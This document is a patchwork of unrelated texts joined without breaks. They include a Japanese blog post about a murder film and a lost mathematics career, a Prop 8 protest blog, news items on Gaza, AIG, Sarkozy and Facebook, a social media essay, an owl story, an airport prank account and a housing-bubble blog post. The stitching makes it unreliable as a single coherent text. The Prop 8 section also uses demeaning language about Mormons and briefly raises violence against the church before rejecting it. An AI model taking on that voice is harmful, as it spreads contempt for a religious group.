黒川信重 先生が( 素数のひみつ - hiroyukikojimaの日記 参照 ) 、この映画で数式の監修をした、とおっしゃっていたから、それを拝見したくも思っていたからだ。映画は予想外に良かった。何がよかったか、というと、犯人である数学者・石神を演じる
堤真一 さんの演技があまりにすばらしかったのだ。(念のために断っておくが、この物語では、最初から犯人がわかっている)。この人物は、かつては数学の天才といわれながら、家庭の事情で数学者への道を閉ざされ、高校で数学を教えながら世捨て人のように生きているような人だ。ぼくは、天才でなかったが、数学の道が閉ざされた、という意味ではこの境遇を味わったことがあり、そのせいか、映画を観ている間、胸が痛く、ずっと涙ぐんでいたのだ。黒川先生が監修した部分は、たぶん、に関する部分だろう。こんなシーンだ。福山演じる物理学者・湯川が堤演じる旧友の数学者・石神を訪ねる。そして、同僚の論文を石神に与える。それは、「 リーマン予想 の反証」を与えた論文だった。この論文が正しいかどうかをチェックすることを石神に依頼するのである。石神は、一心不乱に6時間もかけて、この論文をチェックする。このときの
堤真一 の演技は、迫真である。そして、その反証の誤りを遂に発見する。「 素数 の分布に関するところに間違いがある」と。このような作業を頼む湯川の意図は説明されないが、明らかに、石神が昔のように頭脳明晰であるかどうかを試したのだろう。それは、犯人が驚異的に頭脳の優れた人間であることを確信しているから、それが石神であるかどうかを湯川自身がチェックした、という暗示なのである。
リーマン予想 というのは、 ゼータ関数 に関する予想だが 、 ( ゼータ関数 については、 素数のひみつ - hiroyukikojimaの日記 参照 ) フェルマー予想 ポアンカレ予想 が解決した今、最も解決の期待される予想である。黒川先生の推測では、少なくともあと数年で解決してしまう、ということはなさそう、とのことであった。この予想に関するプロの論文を、6時間でチェックしてしまう石神という男の力量は、すさまじいものなのである。( ちなみに、 黒川信重 の名前は、ちゃんとエンドロールでクレジットされており、所属が(数学者/）となっていたのが爆笑だった。)この映画を観て、いたたまれなかったのは、石神の数学へのひたすらの愛と、道が閉ざされたことへの絶望が、とてもとてもとてもよくわかるからである。数学を志した多くの人は、かなり早期に、つまり少年期に、数学に目覚めている場合が多い。そして、ほとんどの場合、数学以外の将来を考えたことがない。数学がなくなれば、人生のすべてが失われてしまう。数学のない人生は、全くの無意味なものだと思いこんでいる。ぼくが数学に目覚めたのは、中学1年のときだが、それから10年にわたって、数学者以外の将来を考えたことがなかった。数学から遠い人生など、何の意味もない人生だと思っていた。数学だけが、価値あるたった一つのものだった。だから、数学の道が閉ざされたときのぼくの失意は、石神のそれと同じである、と思えた。ぼくは、三度目に院試に落ちたその日に、数学の道にけじめをつけようと思った。その日も、実は、塾で講義をした。数学科の知り合いで塾の同僚だった人に、「よくこんな日に講義ができますね」、と慰めとも皮肉ともつかないことばをかけられたが、講義を休むという選択も思いつかないほど、ぼくは落胆していたのだ。あの日の脱力感は、今でも忘れられない。どんなに熱を出したって、あの日の力の抜け方にまさるものはないだろう。講義をしながら、黒板に数式を並べながら、子供たちを眺め、「これからどんな可能性をも実現しうる」子供たちの未来をうらやみ、まるでそこが異次元かバーチャルな空間かのような気分になっていた。そして、ぼくはそこでなぜだか、「数学者になれなくとも、数学のそばにいよう」という決意をした。一般企業に就職するような選択はせず、不安定な身分ではあっても、塾で数学を教えながら、数学のそばにいよう、そう決意したことを覚えている。あの教室にいた子供たちの生命力が、ぼくに最後のささやかな力をくれたのかもしれない、と思える。それから今にいたるぼくの話は、のあとがきで読んで欲しい。数学者・石神のキャ
ラク ターは、ひょっとすると、数学者・ 佐藤幹夫 さんから想を得ているのかな、とか思った。 佐藤幹夫 は、東大の数学科の出身だが、家庭の事情で一度は高校教員になっている。しかし、数学の道を諦めきれず、夏休みに、下宿の四畳半で、上半身裸のまま汗を手ぬぐいで拭きつつ、すさまじい計算を実行し、後に佐藤超関数と呼ばれるスゴイ概念の発端をつかむ。それを指導教官に持って行くと、学会で発表するように助言され、それをきっかけに数学者への道が再び拓かれる、という希有な人生を歩んだ人である。数論の分野でも、 ゼータ関数 に関す る 「
佐藤・テイト予想」というのを提出し、黒川先生によれば、つい最近、それがテイラーというイギリスの天才によって解決された、とのことだ。(テイラーは、 ワイルズ に協力して、 フェルマー予想 を解決した人でもある ) 。そんなこんなで、犯人である数学者・石神を眺めながら、ぼくはずっと落涙していた。とはいっても犯人は犯人である。しかも、犯行に関しては、狡知に長けている。彼の仕掛けたトリックはあまりに驚異的なものであり、そんな石神を息子にみせてしまっては、「役者と物理学者は許さない。できれば数学者になってパパの無念をはらして欲しい」という切なる願いは、とても言い出しにくくなってしまった。東野さん、すっごいトリックだけど、このようなトリックだけは勘弁して欲しかったです・・・。映画的な試みだと思うが、湯川と石神が冬山を登山するシーンは象徴的だったと思う。数学の道も物理の道も、まさに、このような雪山の登頂と同じだ。極寒のなか、死をも辞さず、一心不乱に昇り続ける。それは、ひたすら、頂上で見える風景のためだけにだ。そして、その風景は、普通の人には価値あるものには思えない類のものである。でも、それがなければ、人生が無意味になってしまう。数学の道とは、そういうものなのだ。涙で目を腫らしながらもぼくは、帰りにアイ
ドルパ ンクバンド の Paramore のライ ブＤＶＤ を買いにいった。渋谷で二件回ったが売り切れ。ぶっちぎれたぼくは、息子の帰宅をつれあいに任せて、その足で新宿に向かった。新宿で二件を回って、やっとゲット！。写真集付きのが入手できなかったので、あとでもうワンセット買うことになるだろう。 アイドル道 を諦めたことは一度もない。アイドルのいない世界なんて、数学が閉ざされた世界以上に無意味だからだ。
Last night I was driving home from dinner around 10 pm .
Normally there would be almost no traffic .
Instead there was traffic -- lots of it , everywhere .
Grrrrrr ... no matter which way I went I was snarled in back - up traffic .
And it was getting worse the further east I went .
It always thins out once you get to the eastside .
That 's when I realized -- that and seeing stragglers with No on 8 signs -- that protesters were protesting up ahead .
I called a friend with eyes and ears to the ground to ask what 's up .
Big protest at Sunset Junction .
Odd , I thought ; no Mormons anywhere near Sunset Junction -- and probably no one who voted Yes on 8 unless it was someone too stoned to remember what Yes and No meant on election day .
I was just a young boy the first time I heard about self - immolation for a political cause .
It was actually more a religious cause but the context was pure politics : the Vietnam War .
The images in 1963 of a Buddhist monk , Thich Quang Duc , setting himself on fire in Saigon have haunted me all these decades .
From Frances Fitzgerald's : " the political climate in Saigon changed as if hit by the drop in pressure preceding a hurricane .
Vast demonstrations broke out .
The city people , who had for years remained passive , terrified before the Diemist police , crowded into the pagodas to kneel and weep , then , following the bonzes [ Buddhist monks ] , burst forth into the streets calling for the downfall of the Ngos [ the ruling family in South Vietnam ] .
" How seriously are people taking the protests over the vote on Prop 8 , a vote that deprives millions of people of a right to marry , that singles them out for second - class citizenship ?
Will snarled traffic make people stop and think ?
Would self - immolation ?
Violence against hate groups like the Mormon " church ? "
Can a boycott of Utah's $ 6 billion tourist industry do anything to root out the hatred and bigotry at the heart of that bizarre cult that has thrived on engendering a sense of persecution among its grotesquely ignorant , brainwashed followers ?
Sure ,
Utah is as much a reactionary hate state as Mormonism is a destructive and dangerous aberration in America ... but what 's going to really help change people 's minds ?
I'm guessing Martin Luther King and Mahatma Gandhi had the winning strategy , far more than Abu Bakir Bashir or brawling monks .
Striking out violently against the Mormon Establishment is counterproductive .
The hard work it takes to change people 's minds and bring them out of the Darkness of Hatred and Bigotry is the only effective way to go about bringing real change .
I 'm glad today 's peaceful demonstration has moved from Sunset Junction to the Mormon cult 's main temple .

Gaza militants have fired dozens of makeshift rockets at southern Israel in recent days .
The rockets cause damage but few injuries .
Hamas armed wing spokesman Abu Ubaida threatened to unleash " hell " on Israel , saying the Islamist group would " teach the enemy a lesson they will never forget . "
Hamas said it was considering a new suicide bombing campaign .
An aide to Israeli Defence Minister Ehud Barak said Israel was prepared to step up its assault " as required " .
Several of the rescuers beat their heads and shouted : " Allahu akbar ( God is greatest ) . "
One badly wounded prostrate man was quietly reciting verses from the Koran .
A five - day Israeli offensive in March killed more than 120 people , but today 's death toll would be the highest for Palestinians since their 1980s uprising .
Witnesses said the attacks were carried out by warplanes and combat helicopters .
Witnesses also reported seeing Israeli planes bombing sites along Gaza 's border with Egypt .
Palestinians use hundreds of tunnels under the border to bring in everything from goods to weapons , making them prime Israeli targets .
The air strikes followed a decision by Israeli Prime Minister Edud Olmert 's security cabinet to widen reprisals for cross - border Palestinian rocket attacks on Israel .
Olmert had warned Hamas , which seized control of the coastal enclave in June 2007 , to stop firing rockets or pay a heavy price .
" I will not hesitate to use Israel 's might to strike Hamas and ( Islamic ) Jihad , " he told Al Arabiya television , an Arab broadcaster widely watched in Gaza .
NEW YORK ( CNNMoney.com ) --
Struggling insurance giant America International Group owes Wall Street firms $ 10 billion from trades that went sour , according to sources cited by The Wall Street Journal .
AIG ( AIG , Fortune 500 ) , which is now operating under government assistance , had not previously detailed these losses , which stemmed from speculative investments in mortgage and corporate debt assets , the Journal wrote on Wednesday .
And now that those investments have gone south , the company must pay off its investment partners .
However , the Journal reported that an AIG spokesman told the paper that AIG defines the trades not as speculative but as " credit protection instruments . "
The spokesman also said the company believed it had already disclosed the exposure .
The government 's $ 150 billion rescue package does n't cover these losses , which raises questions about how AIG will pay off the debts , according to the Journal .
Social media – if you have n’t heard the phrase a hundred times recently , you must spend less time on the internet than I do .
I ’m not trying to exaggerate to make a point either , Google returns almost as many results for “ social media ” as it does for “ mass media . ”
So let ’s put some meaning and historical context behind this oft - used buzzword .
What is Media
The word media derives from the plural form a Latin word that describes someone acting as a “ go between . ”
That is , if person A wants knowledge from person C , the medium is person B who speaks to both C and A .
Over time , the definition of media has evolved to all forms of “ go betweens . ”
Psychic mediums [ sic ] act as the one who connects the customer to supposed psychic spirits .
The television and print media inform the everyday consumer of the knowledge passed on from the high gods of government and commerce .
Even if you ask Joe what Sally was doing last weekend , Joe is acting as the medium between you and Sally .
The point is : information gets passed along , and the distribution mechanism of information is n’t always the same as the originator ( author ) of the information .
When this is the case , the distributor of the information is acting in the role of media .
All Media is Social – Until Mass Media
Prior to the advent of mass production of media information – say , before Newspapers , Television , and Radio – media was a completely social affair .
The town crier would socially interact with the serfs and inform them of the king ’s will .
The priest would mediate between the congregation and their various gods .
Mass Media sort of lost ground with the social aspect of media away while decimating the competition anyway using their superior reach .
It began with newspapers , a simple combination of movable type printing presses and cheap paper .
Information could be provided to a writer and with an overnight industrial process , everyone could be connected to the information given by the author ’s source .
The author , the printing press , even the newspaper boy acts as a media to convey that information – but the process becomes highly unsocial .
The author is not directly interacting with the reader , and the newspaper boy eventually realizes his actual job is to increase sales .
The editors and publishers are also keenly aware of the fact that the media itself requires funding to run – if there is no paid demand for early mass media , there is no media .
At best , there ’s a social aspect to the consumption of mass media – we talk about what we saw in the newspaper , or on TV last night .
Yet in many ways , mass media is not an improvement from older forms of media because it presents more of a one - directional flow of information .
The Internet is a Social Media with Mass Media Reach
The internet has always been a social media .
Even before the internet had gone global , most acts of connecting computers for the purpose of communication is social .
LAN
Parties are social events , local dial - up bulletin boards were highly social communities with functions very similar to internet message boards and online games , so as long as computer networks were growing , so was social media .
So what is this social media everyone is talking about ?
Is n’t it Facebook or Myspace or Linked In or Twitter or something ?
Kind of – Not exactly in my opinion .
This social media is the means of communication and broadcasting created by the internet – by the networking of computers .
In this arrangement , the computer and the digital transfer of communication is the medium between people .
It is a new mass media without the barriers to entry that mark the old mass media .
Where once you needed massive printing presses , now you just need some website hosting and a blog to reach the same potential audience .
Your video or audio creations could be seen by a few or by thousands , but you wo n’t need expensive broadcasting towers and scarce licenses in order to compete and find out just what kind of interest there is .
While the potential audience is incredibly vast , there are still connections that must be made before anyone sees what you ’ve published .
Even with the best connections and most visible links , most surfers will only ever see a fraction of the internet that is out there .
So What ’s the Buzz ?
From a practical marketing standpoint , the commercial goal of social media is to increase broadcasting reach on the new computer - based platform , influence consumer opinion , and drive sales – but there ’s a lot more to it then that .
Mass media has come to affect the entire course of human society – of all endeavors , fields , and even hobbies you can think of .
Media is not an end unto itself , it is a means of accomplishing and furthering these causes that inspire people to action .
It is not just about how information can be shared , but what new information will be created by the synthesis of ideas .
The internet promises to continue that tradition .
So while the internet has always been a means of social interaction , the popularity and traffic trends affirm that surfers want even more social websites .
Growing total traffic numbers also mean that the status of internet as mass media is only becoming more and more assured .
What does it mean for your business or organization ?
How does it create sales ?
Do n’t worry , I ’ll get to that in future posts .
I have a whole social media category to fill up now , so I ’ll be exploring more of the details that turn this potential into a benefit for your website building endeavors and business goals .

Tawny owl 's cover is blown as the autumn wind removes the leaves hiding him in his tree
After a hard night terrorising the local vole population , this little owl is trying to catch up on some well - deserved shuteye .
But , snuggling into its cosy hidey - hole , the tawny owl has n't twigged that its cover has been blown by the fall of autumn leaves .
The roost in an oak tree was a perfect spot for an undisturbed day - time snooze during the summer as dog walkers , joggers and families in Christchurch Park , Ipswich , went about their business 50 ft below .
Wake me up when they 've gone away :
The tawny owl tries to pretend its home is still invisible
Now , despite its best efforts to blend into the woody background -- not to mention keeping its eyes tightly closed , it seems the owl may have to bow to the inevitable and start hunting for a new home .
Park manager Sam Pollard said : ' This one is getting a bit exposed now with the leaves beginning to fall .
' The hole is obviously a nice spot for it because it is protected from the wind and rain .
' But I would n't be surprised if it left soon to find a new spot in one of our evergreen trees . '

BEIJING ( Reuters ) - French President Nicolas Sarkozy will pay a “ heavy price ” for meeting the Dalai Lama , a Chinese state paper said on Monday , keeping up Beijing ’s vitriol over Sarkozy ’s 30 - minute encounter with the exiled Buddhist leader .

Beijing brands the Dalai Lama a dangerous “ splittist ” for demanding self - determination for Tibet and was incensed by Sarkozy ’s meeting on Saturday with the 73 - year - old Buddhist monk .
Sarkozy told the Dalai Lama at their meeting in Poland that Europe shared his concerns over his homeland , which the Dalai Lama fled after a failed uprising against Chinese rule in 1959 .
Chinese Vice Foreign Minister
He Yafei on Sunday said it was up to France to “ fully understand the damage ” done to relations by Sarkozy , who holds the rotating presidency of the European Union until the end of the year .
Now the overseas edition of the People ’s Daily has again warned that China will not easily forget the meeting , accusing Sarkozy of opportunism and trampling on China ’s interests .
“ He ignored China ’s repeated entreaties and stubbornly refused to shift , plainly determined to step over China ’s red line , ” said an editorial in the newspaper , which acts as the voice of the ruling Communist Party .
“ This malicious provocation concerns China ’s core interest in national unity and inevitably will exact a heavy price . ”
The Dalai Lama has met many other Western leaders , including U.S. President George W. Bush .
But China appears increasingly impatient with Western pressure over Tibet , occupied by People ’s Liberation Army troops from 1950 .
And it appears especially angry that Sarkozy met him while holding the EU presidency .
China has not said how it may seek to punish or pressure Sarkozy .
But the friction could make it more difficult for China and Europe to cooperate smoothly in dealing with the global financial crisis and efforts to revive stalled global trade liberalisation talks .
The People ’s Daily said Sarkozy ’s action would “ ultimately damage the whole interests of the French people and the European Union ” .
China abruptly pulled out of a summit with EU leaders but has avoided any talk of sanctions or boycotts .
Chinese internet calls to boycott French - owned stores over the weekend came to nothing .
The European Union is China ’s biggest trade partner and France is eager to sell China products ranging from nuclear power technology to luxury goods .
Sino - French trade grew to $ 32.5 billion in value in the first 10 months of this year , a rise of 21.6 percent on the same period last year , according to Chinese customs numbers .
On Monday , Chinese inspectors said they had found “ quality and safety problems ” with many European foods products shipped to China , the central government website ( www.gov.cn) reported .
The products sent back or destroyed included Italian brandy , British sauce and Belgium chocolate , but not any French goods .
There was no suggestion in the announcement of any link to Chinese anger with the European Union .
The People ’s Daily editorial accused Sarkozy of staging the meeting to shore up his domestic political position .
“ Sarkozy is having a hard time of it .
The economy is in decline , unemployment has jumped and his public approval ratings have slumped , ” said the paper .
“ So Sarkozy has seized upon human rights and Tibetan issues , wanting to stir things up to divert public attention . ”
WASHINGTON -- Advocates on both sides of the aisle are racing to sway a runoff in Georgia that will help determine whether Democrats gain a supermajority in the Senate .
The contest between incumbent Republican Sen. Saxby Chambliss and Democrat Jim Martin -- neither of whom won more than 50 % of the vote on Election Day -- is key to Democrats ' bid for the 60 votes needed to overcome procedural tactics that could complicate President - elect Barack Obama 's legislative agenda .
Two other races , in Alaska and Minnesota , also remain ...
" However , maybe a nice piece of tuna , that would work on me .
And some egg salad .
And one of those big knackwursts , with the sauerkraut .
And a pastrami sandwich on rye , lean , hold the mustard , with a pickle and a side of onion rings , and a chocolate milk shake .
And see if my friend here wants anything . "

For our latest mission , 20 Improv Everywhere agents personally welcomed home total strangers at JFK airport .
Grabbing first and last names from car driver signs , we greeted strangers with personalized posters , flowers , balloons , and a 10 - foot wide banner reading , “ Welcome Back . ”
The plan was simple , our team of 20 agents would head out to JFK airport together with balloons , flowers , poster boards , and markers .
I would approach a driver waiting at baggage claim with a sign , confirm the first and last name of the person he was waiting for , and then let him know that we too were waiting for that person .
We ’d then quickly write the person ’s name on our poster boards and prepare to give them a warm welcome home .
Going over the plan at the Air Train station near JFK
Agent Good looks at arrivals
Agent Nicholson and I had scouted all of the terminals the day before to figure out which ones had the most drivers waiting .
The huge international terminals seemed to be the best bet .
We were a little nervous that we would get someone visiting from a foreign country that did n’t speak English .
I scanned the drivers looking for American sounding names .
I also wanted to find a driver who looked friendly who we could immediately get on our side .
Kevin
I settled on Kevin .
He was waiting for Lori .
I told him we were as well , and right away he was excited to be a part of our welcoming party .
Kevin came right over to stand with us .
“ This is going to be fun , ” he smiled .
After hanging out with us for about ten minutes , he decided it would be a better plan for him to go up front and catch Lori ’s eye as soon as she entered and then lead her over to us .
We agreed .
This way she would find her driver and then be led directly to our party .
Of course , he had no idea that the 20 of us knew Lori about as well as he did .
Agents write Lori ’s name on signs
It was exciting standing there wondering when Lori would arrive .
We had no idea what she looked like , so any woman who walked by could have been her .
We had to stay alert .
Agent Nicholson came up with the great idea to Google Lori ’s full name on his iPhone , and he quickly found this photo :
Lori ?
So we had a photo to go on , but we could n’t be sure it was actually the same Lori and not someone else with the same name .
Tensions mounted as the wait for Lori stretched over the one hour mark .
Kevin had told us that her flight from Rome had long since arrived .
There must have been a long line at customs .
We knew she would n’t leave without her driver , so we just had to patiently wait .
Lori arrives and meets Kevin
Finally she arrived .
As planned she saw Kevin right away and he led her over to us .
The Improv Everywhere team greeting Lori
The look on Lori ’s face was priceless .
We had a few signs with both her first and last name on them so there was no doubt we were there to see her .
Agent Reeves approached with a smile and gave her a bouquet of flowers .
Everyone was cheering and screaming her name .
“ I do n’t think I know these people , ” Lori kept telling Kevin .
Kevin , not in on the mission , kept saying , “ They ’re here for you ! ”
After a minute or two , I approached Lori to let her know that we did n’t know her either , but that we just wanted to welcome her back from her trip .
Knowing that we did n’t know her either seemed to put her at ease .
Although she was still a little dumbfounded as to why we had chosen her , she could n’t stop laughing and thanking us .
Lori and Kevin posed for some photos with the group , holding signs .
We interviewed them both on video for a bit , asking them about the experience .
Lori told us , “ That was very strange .
I was n’t expecting anyone , just my driver .
I saw my first and last name .
I kept thinking this is really me , but this ca n’t be me . ”
Kevin was just as shocked as Lori .
At first he could n’t figure out why Lori was reacting strangely to a large group of what he thought were her close friends .
“ That was a beautiful thing , ” he told us , and then said we could welcome him back at the airport anytime .
We told Lori and Kevin goodbye and they walked off towards his car .
Lori took with her one of the signs , her flowers , and a single blue balloon .
We had so much fun welcoming Lori back that we decided to try it a few more times .
I found another driver with a new name and we started the process all over again .
Our new person was Drew G. Everyone quickly started making new signs as I kept repeating his name .
“ It ’s Drew G , ” I shouted .
Out of nowhere a man replied , “ I ’m Drew G ! ”
We turned around and there he was standing right next to us !
Drew G .
Agents laugh as they realize Drew is right next to them
He had been wandering around trying to find his driver and happened to be passing right by us as I was saying his name .
We all busted out laughing and then hastily started yelling welcome back holding up our just finished signs .
Agent Lindquist handed him a box of New York chocolates and Agent Wimpy gave him flowers .
“ Thank you .
Do I need to kiss you , or anything ? ” he asked .
Agent Wimpy smiled and went in for a European style double kiss .
“ This is cool .
I ’m still trying to figure out what is going on here . ”
Agent Lathan had the best sign
Drew ’s welcoming was short and sweet , especially compared to the hour wait we had for Lori .
No one else in the terminal seemed to notice that the same 20 - person group welcomed home two completely different people in a matter of minutes .
We talked to Drew for a bit and he posed for a few photos .
He left with a sign , flowers , and chocolates , smiling ear to ear .
After Drew left we decided to hop over to another terminal to welcome a couple of more people home .
Surely people would eventually catch on to us if we stayed in the same place .
At the new terminal , I found a very nice driver with a sign for a named John .
He happily agreed to stand right in front of us .
Agent Lindquist bought an “ I Love NY ” bear in the gift shop to give to John .
The IE team waiting for John
After about ten minutes of waiting John arrived .
At first he was completely confused .
He insisted that it was another John the crowd was waiting for .
“ It ’s not me , ” he kept telling his driver .
“ It ’s you !
It ’s you ! ” the driver kept insisting , not understanding the confusion .
I guess having a common name like John made it seem more likely that we were waiting for another person with his full name .
“ It ’s not me . ”
“ It ’s you . ”
Agent Reeves gave him flowers and Agent Lindquist gave him the bear .
“ Who are you people !?!? ”
John smiles as he tried to figure it all out
Once again , Agent Lathan had the best sign : “ You Rock Our World John K . ”
I approached John and explained that we did n’t know him either , and he started laughing .
“ Well , that was really nice , ” he told us .
John posed for a few photos with his fist held triumphantly in the air .
John told us goodbye and headed home to get some rest after his long flight .
We were about to head home ourselves when a man approached me and asked if we could welcome home his daughter and her new husband from their honeymoon .
He had seen us welcoming back John and had figured out what was going on .
“ Sure , ” I told him , “ Just tell us their names . ”
We agreed that he and his wife would hide behind our group and wait a few minutes before revealing themselves .
A few minutes later Jeannine and Dennis arrived .
“ Who are these people ? ”
Agent Reeves and Wimpy gave them both a bouquet of flowers as they stood shocked .
Moments later the parents came out from hiding .
It took a little bit of explaining for them to understand what had happened .
At first they thought their parents had hired a crew to come greet them .
Actually , I guess that ’s pretty much what happened .
It was our last welcoming back of the day , so we gave Jeannine and Dennis our big bunch of balloons to take home with them .
It was a long day for all of us .
Normally no one would want to spend 4 hours at baggage claim , but we had a blast together and managed to meet five new friends .
Everyone on both sides of the welcome back banner had a great time .
Mission Accomplished .

( CNN ) --
Anytime you tinker with something that millions of people use daily , you 're going to upset some folks .
Remember those redesigned $ 20 bills a decade ago -- the ones people said looked like Monopoly money ?
Scott Sanders began an online petition protesting the new Facebook .
It now has more than 1.5 million names .
That may explain why Facebook 's new makeover is sparking strong opinions -- hysteria , even -- among the more than 100 million users of the popular social - networking site .
More than a week after Facebook began forcing users to its redesigned pages , a backlash is still rippling through the online community .
" The new version is cluttered and there 's no continuity to it , " Valerie Stayskal of Addison , Illinois , told CNN .
" I do n't like the tabs they 've got .
When you get to the news feed , you see all these fonts , and it 's just a mess .
Very hard to navigate . "
" Some of these [ changes ] just seem kind of pointless .
The reason I joined Facebook is because it was simple and easy .
Now they 're just making it more complicated , and I really do n't like that , " said Kyle Aevermann of Gilbert , Arizona , who sent his complaints to CNN in an iReport video .
" I just wish they would have kept it how it was . "
iReport.com : Watch Aevermann 's Facebook review
Facebook 's new look separates users ' personal profiles into different areas of the site and provides more tools meant to make it easier to share information and photos .
The changes also shift users ' applications to the bottom of their home page and create more white space -- a move some users fear will lead to more ads on the site .
iReport.com : What do you think of the new Facebook ?
Facebook unveiled the makeover in July and let users decide whether to switch over to the new format or keep using the old one .
But that transition period ended almost two weeks ago , when Facebook eliminated the previous version .
Users logged on to the site to discover the information on their personal profiles had been rearranged .
Do n't Miss iReport.com : New Facebook -- love it or leave it ?
" We are just beginning the process of moving people over to the new Facebook and saying goodbye to the old Facebook , " wrote Mark Slee , product manager for Facebook , in a September 10 blog post on the site .
" We set out to make Facebook simpler , cleaner , more relevant , and easier to control .
With your feedback and participation ... we believe we 've gotten to the best Facebook yet . "
But many users do n't agree .
In the past week , CNN has received more than 200 unsolicited e-mails from people complaining about the new Facebook .
Several online petitions are circulating that urge Facebook to give users the option of returning to the old format .
One , Petition Against the New Facebook , was launched by Scott Sanders , a student at Austin Peay State University in Clarksville , Tennessee , and has more than 1.5 million names .
" Facebook was once the classy alternative to MySpace .
Now it 's the classy girlfriend you once loved , but you begin to feel distant from because she wants to move into your house and tell you what colors to paint your walls and how to arrange your furniture , " said iReporter Sara Campbell , 26 , of Louisville , Kentucky .
" You 're given an ultimatum -- marry me or it 's over .
I wonder how many of us will give into the demands ? "
Many other users defend the new Facebook , saying they find it better organized and easier to navigate .
" Quit your whining .
It just takes time to get used to .
You just have to be patient , " said iReporter George Topouria of Tbilisi , Georgia .
" I actually like the new design .
It may seem to be giving less information on one page , but at least it does n't take a century to load . "
" When a company like Facebook does n't change , it leaves open the possibility that one of countless other social - networking sites will make the changes that Facebook didn't , " said Zack Colman , 24 , of Los Angeles , California .
" For those of you who do n't think the Facebook system was broken , consider how hard it was to sift through all of the applications on someone 's page before finding the relevant information you wanted .
Or even just to write on their wall .
Now , what you want is right in front of you . "
In a September 18 blog post on the site , Facebook co-founder Mark Zuckerberg said that almost 100 million people around the world are now using the new design .
" It 's tempting to say that we should just support both designs , but this is n't as simple as it sounds .
Supporting two versions is a huge amount of work for our small team , and it would mean that going forward we would have to build everything twice .
If we did that then neither version would get our full attention , " said Zuckerberg , who launched Facebook from his Harvard University dorm in 2004 .
" That said , Facebook is a work in progress , " he said .
" We constantly try to improve things and we understand that our work is n't perfect .
Even if you 're joining a group to express things you do n't like about the new design , you 're giving us important feedback and you 're sharing your voice , which is what Facebook is all about . "
The recent makeover is n't the first time Facebook has seen its users protest a change to the site .
In 2006 , the Palo Alto - based startup angered users by introducing a tool called " news feeds " that automatically broadcast users ' personal details .
That furor eventually waned .
Facebook is counting on this one subsiding as well .
" The new Facebook may upset a lot of people at first , but eventually we will get used to it and probably enjoy it more than we used to , " Colman told CNN .
" I 'm sure in a few weeks everything will die down and in a few months everyone will have forgotten completely about the old Facebook . "

Mighty kings rise and fall like the sun .
Southern California decided to take an ancient recipe from the books of history and followed in this time honored path .
Except our king came riding in on a pair of 24 inch spinning rims in a Cadillac Escalade .
The only problem is all of it was mortgaged on a kingdom of sand that is now quickly eroding .
For anyone in Southern California the minor consolation we can take is that this will go down in the history books of financial exuberance like those who lived through the Dutch tulip mania in 1637 .
Tulip contracts were selling at 20 times the annual income of a skilled craftsman .
Remember the story about a farm worker who made $ 14,000 a year and was able to buy a $ 720,000 home back in May of 2007 ?
Why stop at a 20 ratio when we can go over 50 times ?
Now this is the story of glamour and glitz .
The rise and fall of a housing market in a few short years .
In today ’s article I am going to use graphs and data to try to examine the Southern California housing market .
I have been covering the housing market since 2006 in the heat of the insanity and the psychology now is incredibly different .
Prices declining by 40 percent in one year will do that to you .
Southern California according to DataQuick reached a peak median price of $ 505,000 in July of 2007 .
Since that time , the median price has fallen to $ 300,000 .
Keep in mind the median household income for Southern California is under $ 50,000 .
So at the peak , it would take the median household income 10 times their annual earnings to purchase a home in the region .
20 times for a tulip contract , 10 times for a glorious shack .
We will now have our place in the history of magnificent bubbles right their next to the tulip bulb mania from 371 years ago .
So let us get to work since we have a lot to cover .
First , I have compiled a chart showing the median prices for each county in Southern California since the start of the decade .
I have yet to see a chart break out the counties individually like this so the chart should provide a fresh perspective of the data :
( Click for a sharper image )
As you can see from the chart , the pace of growth for the entire region was uniform up until the summer of 2007 .
Like a plateau , we hit a steady pricing trend from 2006 to 2007 before falling off the cliff .
The dotted yellow line is the aggregate of all counties in Southern California .
Many counties are now back to 2003 price levels without adjusting for inflation .
Given the last few months of data , we are looking at least in the short term to heavy and strong deflation in practically every investment vehicle on the market .
What this means is price drops are even worse than they look .
What else can we learn from the chart ?
Without prejudice every region rose at nearly the same pace .
This is the stunning thing to notice when you break the data out .
Every upward county trend in the chart above shows a similar movement upward .
It did n’t matter whether it was Orange County or San Bernardino , the bubble took hold of each county .
The actual nominal price peaks for Orange County and Ventura are simply stunning .
The next chart should sum up nearly an entire decade of housing mania for the region .
I ’ve put together a chart showing the median price for Southern California and the monthly sales for the region :
A couple of things I want to highlight first .
You will notice that for sales , there is always a seasonal drop in the winter and peak in the summer .
That is typical .
It goes up and goes down based on common real estate sales patterns .
Why ?
Many people move during the summer season and most people buy homes during their “ family forming ” years so pulling a kid out of school is n’t the smartest move .
In addition , many people buy homes who are planning on having a family so in general it causes an upsurge during this time .
What you ’ll notice that since 2000 , the troughs were higher during the winter and the peaks were stronger in the summer all the way until 2006 .
That is the first time the summer bounce was n’t as strong as it once was in the heat of the bubble .
It is also the time when you see the median price plateau .
Once this happened , it took about one year for the entire market to collapse and as you can see above , both prices and sales fell off a cliff .
So why are sales now moving up ?
Simple .
Prices have gotten cheaper .
Drastically cheaper .
Even with the amazing upsurge in sales , you can see that we are still very far behind the curve from the bubble days .
Keep in mind we are now entering the typical slow season of winter so it will be interesting to see what happens here .
I maintain that housing prices for Southern California will not bottom out until 2011 .
Now sure , we may hit a bottom in price in 2009 or 2010 but that price will probably be the same in 2011 .
The problem with finding the bottom is you wo n’t know until maybe one year has passed .
But when bubbles burst , especially one this size that has caused so much financial trauma , we will be swimming in scuba gear near the bottom for a few years .
Most kings have a sense when they are facing trouble .
In most cases , a king wo n’t look out his castle ’s window and see thousands of angry peasants with pitchforks and say , “ wow , I did n’t see that coming ! ”
We have many early warning signs .
One thing that is simply laughable from the mainstream media is when they say , “ no one can possibly have seen this coming . ”
Well many economists , bloggers , and some politicians saw this coming so there goes that “ no ” one argument .
In many cases , that is why many media outlets are slashing and burning staff because how can they claim to be credible when many independent sources have done the research they did n’t and have issued many siren calls in the past ?
Many readers are smart enough to see who is credible and who is simply playing catch up .
Why pay a writer a high six figure salary when a blogger knowledgeable in the subject is already writing about it ?
What was one thing that was missed that approached like an angry mob screaming and chanting ?
Notice of defaults and foreclosures :
Take a look at the chart above very carefully .
You notice that tiny red sliver of foreclosures in Q2 of 2006 ?
That was the wake up call .
These foreclosures were probably the most egregious fraud cases because look at the peak prices above .
Practically anyone could sell a home at peak price with little work .
After this point in 2006 , a trend was noticeably appearing .
No one saw this coming ?
Maybe they did n’t but many who actually understand these trends tried to echo a warning but bubbles are hard to burst .
It is like the party with no parent and the punchbowl needs to be taken away because people are way too drunk .
Who will be the one to end the fun ?
You would hope that regulators such as the Fed or our government would have something to say but instead , we have Alan Greenspan saying how fantastic adjustable rate mortgages are !
So that has already passed .
